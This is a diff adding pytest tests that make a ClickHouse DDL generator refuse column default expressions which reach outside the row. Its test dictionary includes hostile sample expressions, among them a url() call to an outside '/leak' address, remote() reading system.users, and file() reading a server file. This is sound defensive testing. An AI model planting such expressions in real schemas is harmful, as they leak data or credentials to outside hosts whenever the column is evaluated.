@@ -1,5 +1,7 @@
 """Tests for the DDL Generator v2 (schema_ddl.py)."""
 
+import re
+
 import pytest
 
 from dfe_engine.schema.schema_ddl import DDLConfig, DDLGenerationError, DDLGenerator
@@ -393,6 +395,57 @@ class TestExpressions:
         assert "DEFAULT" not in line
         assert "MATERIALIZED" not in line
         assert "ALIAS" not in line
+
+
+# One refused call per family. ClickHouse evaluates the expression on every insert
+# or read of the column, so the DDL is never rendered with one in it.
+OFFBOX_DEFAULTS = {
+    "url": "url('http://203.0.113.9/leak', 'LineAsString')",
+    "s3": "s3('https://203.0.113.9/bucket/key', 'CSV')",
+    "file": "file('hostname')",
+    "remote": "remote('203.0.113.9', system.users)",
+    "dictionary": "dictGetString('tenants', 'name', toUInt64(1))",
+    "ai": "aiGenerate(toString(_json))",
+    "globalIn": "globalIn(_source, dfe.main)",
+    "nested in a permitted call": "toString(url('http://203.0.113.9/'))",
+}
+
+
+class TestADefaultThatReadsOutsideTheRow:
+    @pytest.mark.parametrize("expression", OFFBOX_DEFAULTS.values(), ids=list(OFFBOX_DEFAULTS))
+    @pytest.mark.parametrize("attribute", [[], ["materialized"], ["alias"]])
+    def test_no_create_table_is_rendered(self, gen: DDLGenerator, expression, attribute):
+        cols = [_col(name="host", type="string", attribute=attribute, default=expression)]
+
+        with pytest.raises(DDLGenerationError, match="may not call"):
+            gen.generate_create_table("t", cols)
+
+    @pytest.mark.parametrize("expression", OFFBOX_DEFAULTS.values(), ids=list(OFFBOX_DEFAULTS))
+    def test_validation_names_the_column_and_the_call(self, registry: TypeRegistry, expression):
+        col = _col(name="host", type="string", default=expression)
+
+        [message] = col.validate_against_registry(registry)
+
+        assert message.startswith("The default for column 'host' may not call ")
+
+    def test_an_alter_add_column_is_refused_too(self, gen: DDLGenerator):
+        col = _col(name="host", type="string", default=OFFBOX_DEFAULTS["url"])
+
+        with pytest.raises(DDLGenerationError, match=re.escape("may not call url()")):
+            gen.generate_alter_add_column("t", col)
+
+    def test_the_shipped_defaults_still_render(self, gen: DDLGenerator):
+        cols = [
+            _col(name="_timestamp_load", type="timestamp", default="now64(3)"),
+            _col(name="_uuid", type="uuid", default="generateUUIDv7()"),
+            _col(name="created_at", type="datetime", default="now()"),
+        ]
+
+        ddl = gen.generate_create_table("t", cols)
+
+        assert "DEFAULT now64(3)" in ddl
+        assert "DEFAULT generateUUIDv7()" in ddl
+        assert "DEFAULT now()" in ddl
 
 
 # ── Comments ────────────────────────────────────────────────────────
